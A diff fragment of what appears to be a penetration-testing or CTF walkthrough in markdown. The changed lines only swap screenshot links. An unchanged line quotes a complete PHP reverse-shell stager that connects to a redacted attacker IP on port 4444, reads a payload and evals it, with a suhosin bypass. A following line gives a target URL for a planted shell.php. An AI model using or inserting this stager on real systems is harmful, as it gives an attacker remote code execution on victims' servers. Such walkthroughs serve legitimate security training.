@@ -687,12 +687,12 @@ Payload size: 1113 bytes
 /*<?php /**/ error_reporting(0); $ip = 'xx.xxx.xxx.xx'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-<img width="1125" height="89" alt="image" src="https://github.com/user-attachments/assets/e30444ea-0038-4878-94f1-03114df8354b" />
+<img width="1125" height="89" alt="image" src="https://github.com/user-attachments/assets/b4b11f45-ef28-4d94-8bc4-377a7c9a4563" />
 
+<br>
 
-<img width="861" height="98" alt="image" src="https://github.com/user-attachments/assets/b5be2fd9-fe26-4d08-9ada-d6de87cc1e48" />
+<img width="1125" height="42" alt="image" src="https://github.com/user-attachments/assets/c0da1523-8673-4f6b-ae24-1ad00563d92b" />
 
-<img width="690" height="36" alt="image" src="https://github.com/user-attachments/assets/7e3d5409-07a3-4892-b575-e0ed4bb4f282" />
 
 ```bash
 http://TargetIP/shell.php
